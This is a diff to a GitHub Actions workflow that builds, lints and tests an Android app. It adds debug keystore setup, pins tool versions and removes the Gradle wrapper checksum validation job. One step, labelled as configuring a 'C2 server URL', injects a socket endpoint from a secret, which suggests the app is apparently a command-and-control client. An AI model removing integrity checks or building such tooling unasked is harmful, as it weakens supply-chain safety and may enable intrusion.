@@ -32,24 +32,15 @@ concurrency:
 
 env:
   COMPILE_SDK: 34
+  BUILD_TOOLS: 34.0.0
   JAVA_VERSION: 17
+  NDK_VERSION: 26.3.11579264
+  # Debug keystore credentials (standard Android debug keystore defaults)
+  DEBUG_KEYSTORE_PASS: android
+  DEBUG_KEY_ALIAS: androiddebugkey
+  DEBUG_KEY_PASS: android
 
 jobs:
-  # ──────────────────────────────────────────────
-  # JOB: wrapper-validation — ensures Gradle wrapper integrity
-  # ──────────────────────────────────────────────
-  wrapper-validation:
-    name: Validate Gradle Wrapper
-    runs-on: ubuntu-latest
-    timeout-minutes: 5
-
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Validate Gradle wrapper checksum
-        uses: gradle/actions/wrapper-validate@v4
-
   # ──────────────────────────────────────────────
   # JOB: Validate — checks formatting and lint
   # ──────────────────────────────────────────────
@@ -57,7 +48,6 @@ jobs:
     name: Lint & Validate
     runs-on: ubuntu-latest
     timeout-minutes: 30
-    needs: [wrapper-validation]
 
     steps:
       - name: Checkout repository
@@ -73,7 +63,35 @@ jobs:
         uses: android-actions/setup-android@v3
         with:
           api-level: ${{ env.COMPILE_SDK }}
-          build-tools-version: latest
+          build-tools-version: ${{ env.BUILD_TOOLS }}
+
+      - name: Create Android debug keystore (if missing)
+        run: |
+          KEYSTORE_DIR="$HOME/.android"
+          KEYSTORE_FILE="$KEYSTORE_DIR/debug.keystore"
+          mkdir -p "$KEYSTORE_DIR"
+          if [ ! -f "$KEYSTORE_FILE" ]; then
+            echo "Creating debug keystore at $KEYSTORE_FILE..."
+            keytool -genkey -v -keystore "$KEYSTORE_FILE" \
+              -storepass "${{ env.DEBUG_KEYSTORE_PASS }}" \
+              -alias "${{ env.DEBUG_KEY_ALIAS }}" \
+              -keypass "${{ env.DEBUG_KEY_PASS }}" \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -dname "CN=Android Debug,O=Android,C=US" \
+              -noprompt
+            echo "✅ Debug keystore created"
+          else
+            echo "✅ Debug keystore already exists"
+          fi
+
+      - name: Verify NDK and CMake
+        run: |
+          echo "::group::CMake version"
+          cmake --version || echo "⚠️ cmake not found — will be downloaded by Gradle"
+          echo "::endgroup::"
+          echo "::group::NDK locations"
+          ls -la "$ANDROID_HOME/ndk/" 2>/dev/null || echo "No NDK installed yet — Gradle will download NDK ${{ env.NDK_VERSION }}"
+          echo "::endgroup::"
 
       - name: Cache Gradle dependencies
         uses: actions/cache@v4
@@ -82,7 +100,7 @@ jobs:
             ~/.gradle/caches
             ~/.gradle/wrapper
             !~/.gradle/caches/build-cache-*
-          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties', 'app/src/main/jni/CMakeLists.txt') }}
           restore-keys: |
             ${{ runner.os }}-gradle-
 
@@ -90,7 +108,7 @@ jobs:
         run: chmod +x gradlew
 
       - name: Run Android Lint
-        run: ./gradlew lintDebug --no-daemon
+        run: ./gradlew lintDebug --no-daemon --stacktrace
 
       - name: Upload lint results
         if: always()
@@ -123,7 +141,26 @@ jobs:
         uses: android-actions/setup-android@v3
         with:
           api-level: ${{ env.COMPILE_SDK }}
-          build-tools-version: latest
+          build-tools-version: ${{ env.BUILD_TOOLS }}
+
+      - name: Create Android debug keystore (if missing)
+        run: |
+          KEYSTORE_DIR="$HOME/.android"
+          KEYSTORE_FILE="$KEYSTORE_DIR/debug.keystore"
+          mkdir -p "$KEYSTORE_DIR"
+          if [ ! -f "$KEYSTORE_FILE" ]; then
+            echo "Creating debug keystore at $KEYSTORE_FILE..."
+            keytool -genkey -v -keystore "$KEYSTORE_FILE" \
+              -storepass "${{ env.DEBUG_KEYSTORE_PASS }}" \
+              -alias "${{ env.DEBUG_KEY_ALIAS }}" \
+              -keypass "${{ env.DEBUG_KEY_PASS }}" \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -dname "CN=Android Debug,O=Android,C=US" \
+              -noprompt
+            echo "✅ Debug keystore created"
+          else
+            echo "✅ Debug keystore already exists"
+          fi
 
       - name: Cache Gradle dependencies
         uses: actions/cache@v4
@@ -132,7 +169,7 @@ jobs:
             ~/.gradle/caches
             ~/.gradle/wrapper
             !~/.gradle/caches/build-cache-*
-          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties', 'app/src/main/jni/CMakeLists.txt') }}
           restore-keys: |
             ${{ runner.os }}-gradle-
 
@@ -140,7 +177,7 @@ jobs:
         run: chmod +x gradlew
 
       - name: Run unit tests
-        run: ./gradlew testDebugUnitTest --no-daemon
+        run: ./gradlew testDebugUnitTest --no-daemon --stacktrace
 
       - name: Upload test results
         if: always()
@@ -175,7 +212,26 @@ jobs:
         uses: android-actions/setup-android@v3
         with:
           api-level: ${{ env.COMPILE_SDK }}
-          build-tools-version: latest
+          build-tools-version: ${{ env.BUILD_TOOLS }}
+
+      - name: Create Android debug keystore (if missing)
+        run: |
+          KEYSTORE_DIR="$HOME/.android"
+          KEYSTORE_FILE="$KEYSTORE_DIR/debug.keystore"
+          mkdir -p "$KEYSTORE_DIR"
+          if [ ! -f "$KEYSTORE_FILE" ]; then
+            echo "Creating debug keystore at $KEYSTORE_FILE..."
+            keytool -genkey -v -keystore "$KEYSTORE_FILE" \
+              -storepass "${{ env.DEBUG_KEYSTORE_PASS }}" \
+              -alias "${{ env.DEBUG_KEY_ALIAS }}" \
+              -keypass "${{ env.DEBUG_KEY_PASS }}" \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -dname "CN=Android Debug,O=Android,C=US" \
+              -noprompt
+            echo "✅ Debug keystore created"
+          else
+            echo "✅ Debug keystore already exists"
+          fi
 
       - name: Cache Gradle dependencies
         uses: actions/cache@v4
@@ -184,7 +240,7 @@ jobs:
             ~/.gradle/caches
             ~/.gradle/wrapper
             !~/.gradle/caches/build-cache-*
-          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties', 'app/src/main/jni/CMakeLists.txt') }}
           restore-keys: |
             ${{ runner.os }}-gradle-
 
@@ -201,8 +257,11 @@ jobs:
         run: chmod +x gradlew
 
       # Optionally override SOCKET_URL via repository secret
+      # Use job-level env variable to work around secrets not being available in if:
       - name: Configure C2 server URL (if secret set)
-        if: secrets.CI_SOCKET_URL != ''
+        env:
+          CI_SOCKET_URL: ${{ secrets.CI_SOCKET_URL }}
+        if: ${{ env.CI_SOCKET_URL != '' }}
         run: |
           # Escape the URL for use in sed (handle special chars in URL)
           OLD_URL=$(grep 'SOCKET_URL' app/build.gradle | sed "s/.*\"\\(.*\\)\".*/\\1/")
@@ -210,8 +269,17 @@ jobs:
           echo "Overriding SOCKET_URL: $OLD_URL → $NEW_URL"
           sed -i "s|$OLD_URL|$NEW_URL|g" app/build.gradle
 
+      - name: Verify google-services.json exists
+        run: |
+          if [ -f app/google-services.json ]; then
+            echo "✅ google-services.json found (size: $(wc -c < app/google-services.json) bytes)"
+          else
+            echo "❌ google-services.json MISSING — Firebase plugin will fail!"
+            exit 1
+          fi
+
       - name: Build debug APK
-        run: ./gradlew assembleDebug --no-daemon
+        run: ./gradlew assembleDebug --no-daemon --stacktrace
 
       - name: Check APK exists
         run: |
